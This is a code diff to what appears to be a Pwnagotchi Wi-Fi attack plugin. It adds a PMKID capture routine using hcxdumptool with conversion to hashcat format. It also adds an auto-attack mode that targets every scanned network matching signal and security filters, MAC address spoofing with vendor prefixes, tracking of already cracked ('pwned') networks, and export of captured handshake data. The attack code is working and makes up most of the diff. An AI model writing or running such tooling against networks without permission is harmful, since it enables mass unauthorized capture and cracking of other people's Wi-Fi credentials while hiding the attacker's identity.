@@ -50,6 +50,7 @@ import hashlib
 import json
 import logging
 import os
+import random
 import re
 import shutil
 import signal
@@ -71,7 +72,7 @@ _DEFAULT_UPDATE_URL = (
 
 class WdScanner(plugins.Plugin):
     __author__ = "you@example.com"
-    __version__ = "2.4.0"
+    __version__ = "2.5.0"
     __license__ = "GPL3"
     __description__ = (
         "Use a second radio to scan for SSIDs/clients and selectively deauth "
@@ -139,6 +140,28 @@ class WdScanner(plugins.Plugin):
         self._plunder_log = []
         self._plunder_seconds = 300          # total budget per plunder job
 
+        # PMKID attack state.
+        self._pmkid_attack_mode = False      # use PMKID instead of deauth
+        self._pmkid_available = False        # set after checking for hcxdumptool
+
+        # Target filtering.
+        self._filter_min_signal = -100       # dBm
+        self._filter_min_clients = 0
+        self._filter_security = []           # list: ["WPA2", "WPA3", etc.] empty = all
+        self._filter_hide_pwned = False
+
+        # Auto-attack mode.
+        self._auto_attack = False            # attack everything seen during scan
+        self._auto_attack_history = set()    # BSSIDs already auto-attacked
+
+        # Network notes (persisted).
+        self._notes = {}                     # {bssid: "note text"}
+        self._notes_file = None              # path set in on_loaded
+
+        # MAC randomization.
+        self._mac_random_enabled = False
+        self._mac_random_oui = None          # "Apple", "Samsung", etc.
+
         # Auto-updater state.
         self._update_url = _DEFAULT_UPDATE_URL
         self._update_check_interval = 24 * 3600   # seconds between checks
@@ -184,9 +207,26 @@ class WdScanner(plugins.Plugin):
         # Plunder config.
         self._plunder_seconds = int(opts.get("plunder_seconds", 300))
 
+        # Auto-attack config.
+        self._auto_attack = bool(opts.get("auto_attack", False))
+
+        # Check for PMKID tools.
+        self._pmkid_available = (
+            shutil.which("hcxdumptool") is not None
+            and shutil.which("hcxpcapngtool") is not None
+        )
+
         if shutil.which("airodump-ng") is None or shutil.which("airmon-ng") is None:
             logging.error("[wd_scanner] aircrack-ng suite not found on PATH.")
             return
+
+        # Setup notes file.
+        try:
+            handshakes = self._agent.config()["bettercap"]["handshakes"]
+            self._notes_file = os.path.join(handshakes, "wd_scanner_notes.json")
+            self._load_notes()
+        except Exception:
+            self._notes_file = None
 
         try:
             self._update_local_sha = self._sha256_of_self()
@@ -197,6 +237,10 @@ class WdScanner(plugins.Plugin):
             "[wd_scanner] loaded v%s; pick an aux radio from /plugins/wd_scanner/",
             self.__version__,
         )
+        if self._pmkid_available:
+            logging.info("[wd_scanner] PMKID attack mode available (hcxdumptool detected)")
+        if self._auto_attack:
+            logging.info("[wd_scanner] AUTO-ATTACK enabled: will attack all targets during scans")
 
     def on_ready(self, agent):
         self._agent = agent
@@ -304,6 +348,79 @@ class WdScanner(plugins.Plugin):
             return os.path.basename(target)
         except OSError:
             return None
+
+    # ------------------------------------------------------- notes persistence
+
+    def _load_notes(self):
+        """Load network notes from disk."""
+        if not self._notes_file:
+            return
+        try:
+            if os.path.exists(self._notes_file):
+                with open(self._notes_file, "r") as f:
+                    self._notes = json.load(f)
+        except Exception as e:
+            logging.warning("[wd_scanner] failed to load notes: %s", e)
+            self._notes = {}
+
+    def _save_notes(self):
+        """Save network notes to disk."""
+        if not self._notes_file:
+            return
+        try:
+            with open(self._notes_file, "w") as f:
+                json.dump(self._notes, f, indent=2)
+        except Exception as e:
+            logging.warning("[wd_scanner] failed to save notes: %s", e)
+
+    def _set_note(self, bssid, note):
+        """Set or clear a note for a BSSID."""
+        bssid = bssid.lower()
+        if note and note.strip():
+            self._notes[bssid] = note.strip()
+        else:
+            self._notes.pop(bssid, None)
+        self._save_notes()
+
+    def _get_note(self, bssid):
+        """Get note for a BSSID, or empty string."""
+        return self._notes.get(bssid.lower(), "")
+
+    # -------------------------------------------------------- MAC randomization
+
+    _MAC_OUI_PRESETS = {
+        "Apple": "00:17:F2",
+        "Samsung": "00:12:FB",
+        "Dell": "00:14:22",
+        "Intel": "00:1B:77",
+        "Cisco": "00:0A:41",
+        "HP": "00:17:08",
+        "Asus": "00:1F:C6",
+        "Microsoft": "00:50:F2",
+    }
+
+    def _randomize_mac(self, iface):
+        """Randomize MAC address on interface."""
+        if not self._mac_random_enabled:
+            return
+        try:
+            # Generate random MAC.
+            if self._mac_random_oui and self._mac_random_oui in self._MAC_OUI_PRESETS:
+                oui = self._MAC_OUI_PRESETS[self._mac_random_oui]
+                # Random NIC portion.
+                nic = ":".join(["%02x" % random.randint(0, 255) for _ in range(3)])
+                mac = "%s:%s" % (oui, nic)
+            else:
+                # Fully random MAC with local bit set.
+                mac = "%02x" % (random.randint(0, 255) | 0x02)  # locally administered
+                mac += "".join([":%02x" % random.randint(0, 255) for _ in range(5)])
+
+            self._run(["ip", "link", "set", iface, "down"], check=False, timeout=5)
+            self._run(["ip", "link", "set", iface, "address", mac], check=False, timeout=5)
+            self._run(["ip", "link", "set", iface, "up"], check=False, timeout=5)
+            logging.info("[wd_scanner] randomized MAC on %s to %s", iface, mac)
+        except Exception as e:
+            logging.warning("[wd_scanner] MAC randomization failed: %s", e)
 
     # ---------------------------------------------------------- iface selection
 
@@ -602,6 +719,10 @@ class WdScanner(plugins.Plugin):
                 return -p
             results.sort(key=_rank)
             self._last_scan_results = results
+
+            # Auto-attack if enabled.
+            if self._auto_attack:
+                self._trigger_auto_attack()
         finally:
             self._scan_running = False
 
@@ -650,6 +771,10 @@ class WdScanner(plugins.Plugin):
                 self._last_scan_error = "no CSV produced by airodump-ng"
                 return
             self._last_scan_results = self._parse_airodump_csv(csvs[-1])
+
+            # Auto-attack if enabled.
+            if self._auto_attack:
+                self._trigger_auto_attack()
         except Exception as e:
             logging.exception("[wd_scanner] scan failed")
             self._last_scan_error = str(e)
@@ -946,6 +1071,12 @@ class WdScanner(plugins.Plugin):
                 self._log_action(
                     "shared-radio attack: pwnagotchi paused while we capture"
                 )
+
+            # Use PMKID attack if enabled and available.
+            if self._pmkid_attack_mode and self._pmkid_available:
+                self._pmkid_attack(bssid, channel, ssid)
+                return
+
             self._log_action("pinning main radio to channel %d for %s (%s)"
                              % (channel, ssid, bssid))
             try:
@@ -987,6 +1118,123 @@ class WdScanner(plugins.Plugin):
             except Exception as e:
                 self._log_action("could not clear channel pin: %s" % e)
             self._action_running = False
+
+    def _pmkid_attack(self, bssid, channel, ssid):
+        """PMKID attack using hcxdumptool."""
+        self._log_action("PMKID attack mode: targeting %s (%s) on ch%d" % (ssid, bssid, channel))
+
+        iface = self._mon_iface or self._iface_cfg
+        if not iface:
+            self._log_action("ERROR: no interface available for PMKID attack")
+            return
+
+        handshake_dir = self._handshake_dir()
+        pcapng_file = os.path.join(handshake_dir, "wd_pmkid_%s_%d.pcapng" % (
+            bssid.replace(":", ""), int(time.time())
+        ))
+
+        try:
+            self._log_action("running hcxdumptool on %s for 60s..." % iface)
+            self._log_action("  output: %s" % pcapng_file)
+
+            # Run hcxdumptool to capture PMKID.
+            proc = subprocess.Popen([
+                "hcxdumptool",
+                "-i", iface,
+                "-o", pcapng_file,
+                "--enable_status=1",
+                "--filterlist_ap=%s" % bssid,
+                "--filtermode=2",
+            ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+
+            # Let it run for 60 seconds.
+            time.sleep(60)
+            proc.terminate()
+            try:
+                proc.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+
+            self._log_action("hcxdumptool capture complete")
+
+            # Convert to hashcat format using hcxpcapngtool.
+            if os.path.exists(pcapng_file):
+                hash_file = pcapng_file.replace(".pcapng", ".hc22000")
+                self._log_action("converting to hashcat format: %s" % hash_file)
+                result = self._run([
+                    "hcxpcapngtool",
+                    "-o", hash_file,
+                    pcapng_file
+                ], check=False, timeout=30)
+
+                if os.path.exists(hash_file):
+                    self._log_action("PMKID captured: %s" % os.path.basename(hash_file))
+                    self._new_handshakes.append(os.path.basename(hash_file))
+                else:
+                    self._log_action("no PMKID found for %s" % bssid)
+            else:
+                self._log_action("ERROR: capture file not created")
+        except Exception as e:
+            self._log_action("PMKID attack failed: %s" % e)
+
+    def _trigger_auto_attack(self):
+        """Auto-attack all networks seen in last scan that match filters."""
+        threading.Thread(target=self._auto_attack_worker, daemon=True).start()
+
+    def _auto_attack_worker(self):
+        """Sequential auto-attack worker."""
+        targets = self._last_scan_results or []
+        for ap in targets:
+            bssid = ap.get("bssid")
+            if not bssid or bssid in self._auto_attack_history:
+                continue
+
+            # Apply filters.
+            if not self._matches_filters(ap):
+                continue
+
+            self._auto_attack_history.add(bssid)
+            channel = ap.get("channel")
+            ssid = ap.get("ssid", "")
+
+            logging.info("[wd_scanner] auto-attack: %s (%s) ch%s", ssid, bssid, channel)
+
+            # Wait for any running attack to finish.
+            while self._action_running:
+                time.sleep(1)
+
+            # Start attack.
+            self._start_attack(bssid, channel, ssid)
+
+            # Wait for it to complete before next target.
+            while self._action_running:
+                time.sleep(1)
+
+    def _matches_filters(self, ap):
+        """Check if AP matches current filters."""
+        # Signal strength filter.
+        power = ap.get("power", -100)
+        if power < self._filter_min_signal:
+            return False
+
+        # Client count filter.
+        clients = ap.get("clients", 0)
+        if clients < self._filter_min_clients:
+            return False
+
+        # Security type filter.
+        if self._filter_security:
+            sec = ap.get("security", "")
+            if sec not in self._filter_security:
+                return False
+
+        # Hide pwned networks filter.
+        if self._filter_hide_pwned:
+            bssid = ap.get("bssid", "")
+            if self._get_password(bssid):
+                return False
+
+        return True
 
     # -------------------------------------------------------------- recon
 
@@ -2177,6 +2425,35 @@ class WdScanner(plugins.Plugin):
         if not path or not os.path.isdir(path):
             return []
         return os.listdir(path)
+
+    def _export_target_data(self, bssid):
+        """Export all data for a specific BSSID as tar.gz."""
+        handshake_dir = self._handshake_dir()
+        bssid_clean = bssid.replace(":", "").lower()
+
+        # Find all files related to this BSSID.
+        files_to_export = []
+        for fname in os.listdir(handshake_dir):
+            if bssid_clean in fname.lower():
+                files_to_export.append(fname)
+
+        if not files_to_export:
+            return None
+
+        # Create tar.gz archive.
+        archive_name = "wd_export_%s_%d.tar.gz" % (bssid_clean, int(time.time()))
+        archive_path = os.path.join(handshake_dir, archive_name)
+
+        try:
+            import tarfile
+            with tarfile.open(archive_path, "w:gz") as tar:
+                for fname in files_to_export:
+                    fpath = os.path.join(handshake_dir, fname)
+                    tar.add(fpath, arcname=fname)
+            return archive_name
+        except Exception as e:
+            logging.error("[wd_scanner] export failed: %s", e)
+            return None
 
     # ------------------------------------------------------------------- shell
 
